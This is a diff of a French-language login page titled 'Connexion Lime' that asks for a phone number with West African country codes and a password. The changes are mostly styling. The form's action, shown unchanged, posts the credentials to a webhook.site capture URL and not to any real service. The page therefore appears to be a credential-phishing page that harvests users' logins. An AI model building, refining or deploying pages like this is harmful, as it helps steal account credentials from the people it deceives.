@@ -3,111 +3,120 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Connexion</title>
+  <title>Connexion Lime</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: Arial, sans-serif;
       margin: 0;
-      background-color: #ffffff;
+      font-family: 'Arial', sans-serif;
+      background-color: #fff;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
     }
 
     .container {
-      max-width: 400px;
       width: 100%;
+      max-width: 400px;
       padding: 20px;
     }
 
     h1 {
       font-size: 24px;
+      font-weight: bold;
       margin-bottom: 10px;
     }
 
     p {
-      color: #777;
-      margin-top: 0;
-      margin-bottom: 30px;
+      color: #666;
+      margin-bottom: 25px;
     }
 
     label {
       display: block;
-      margin-bottom: 5px;
       font-weight: bold;
+      margin-bottom: 6px;
     }
 
-    .phone-input {
+    .phone-wrapper {
       display: flex;
-      align-items: center;
       margin-bottom: 20px;
     }
 
     select {
-      padding: 10px;
+      padding: 12px;
       border: 1px solid #ccc;
       border-radius: 8px 0 0 8px;
+      font-size: 14px;
+      background-color: #fff;
       outline: none;
     }
 
     input[type="tel"] {
       flex: 1;
-      padding: 10px;
+      padding: 12px;
       border: 1px solid #ccc;
       border-left: none;
       border-radius: 0 8px 8px 0;
+      font-size: 14px;
       outline: none;
     }
 
-    .password-container {
+    .password-wrapper {
       position: relative;
       margin-bottom: 20px;
     }
 
-    input[type="password"],
-    input[type="text"] {
+    .password-wrapper input {
       width: 100%;
-      padding: 10px 40px 10px 10px;
+      padding: 12px 40px 12px 12px;
       border: 1px solid #ccc;
       border-radius: 8px;
+      font-size: 14px;
       outline: none;
     }
 
     .toggle-password {
       position: absolute;
-      right: 10px;
       top: 50%;
+      right: 12px;
       transform: translateY(-50%);
-      background: none;
-      border: none;
       cursor: pointer;
     }
 
     .toggle-password svg {
-      width: 24px;
-      height: 24px;
+      width: 20px;
+      height: 20px;
     }
 
-    button {
-      width: 100%;
-      background-color: #3366ff;
+    .btn {
+      background-color: #2f80ed;
       color: white;
-      padding: 12px;
       border: none;
+      padding: 12px;
+      width: 100%;
       border-radius: 8px;
       font-size: 16px;
       cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .btn:hover {
+      background-color: #1c5fc0;
     }
 
     .signup {
       text-align: center;
       margin-top: 20px;
-      color: #777;
+      font-size: 14px;
     }
 
     .signup a {
-      color: #3366ff;
+      color: #2f80ed;
       text-decoration: none;
       font-weight: bold;
     }
@@ -119,52 +128,47 @@
     <p>Connectez-vous à votre compte</p>
 
     <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
+      
       <label for="phone">Numéro de Téléphone</label>
-      <div class="phone-input">
-        <select name="code">
+      <div class="phone-wrapper">
+        <select name="prefix">
           <option value="+221">+221</option>
           <option value="+225">+225</option>
           <option value="+226">+226</option>
-          <option value="+228">+228</option>
-          <option value="+229">+229</option>
-          <option value="+237">+237</option>
+          <!-- Ajoute plus si besoin -->
         </select>
-        <input type="tel" name="phone" placeholder="Veuillez entrer votre numéro de téléphone" required />
+        <input type="tel" name="phone" id="phone" placeholder="Veuillez entrer votre numéro de téléphone" required />
       </div>
 
       <label for="password">Mot de passe de Connexion</label>
-      <div class="password-container">
+      <div class="password-wrapper">
         <input type="password" name="password" id="password" placeholder="Mot de passe de Connexion" required />
-        <button type="button" class="toggle-password" onclick="togglePassword()">
-          <!-- Icône œil masqué (par défaut) -->
-          <svg id="eyeClosed" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="black" viewBox="0 0 24 24"><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-1.3.25-2.538.703-3.675m1.66-2.51A9.956 9.956 0 0112 3c5.523 0 10 4.477 10 10 0 2.113-.655 4.067-1.77 5.665M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M3 3l18 18"/></svg>
-          <!-- Icône œil ouvert -->
-          <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="black" viewBox="0 0 24 24" style="display:none;"><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" /><path stroke-width="2" stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5s8.268 2.943 9.542 7c-1.274 4.057-5.065 7-9.542 7s-8.268-2.943-9.542-7z"/></svg>
-        </button>
+        <span class="toggle-password" onclick="togglePasswordVisibility()">
+          <!-- Icône œil -->
+          <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="#555" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24">
+            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </span>
       </div>
 
-      <button type="submit">Se Connecter Maintenant</button>
-
-      <div class="signup">
-        Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a>
-      </div>
+      <button class="btn" type="submit">Se Connecter Maintenant</button>
     </form>
+
+    <div class="signup">
+      Vous n’avez pas de compte ? <a href="#">Inscrivez-vous</a>
+    </div>
   </div>
 
   <script>
-    function togglePassword() {
-      const passwordInput = document.getElementById("password");
-      const eyeOpen = document.getElementById("eyeOpen");
-      const eyeClosed = document.getElementById("eyeClosed");
+    function togglePasswordVisibility() {
+      const passwordInput = document.getElementById('password');
+      const icon = document.getElementById('eyeIcon');
 
-      if (passwordInput.type === "password") {
-        passwordInput.type = "text";
-        eyeClosed.style.display = "none";
-        eyeOpen.style.display = "inline";
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
       } else {
-        passwordInput.type = "password";
-        eyeClosed.style.display = "inline";
-        eyeOpen.style.display = "none";
+        passwordInput.type = 'password';
       }
     }
   </script>
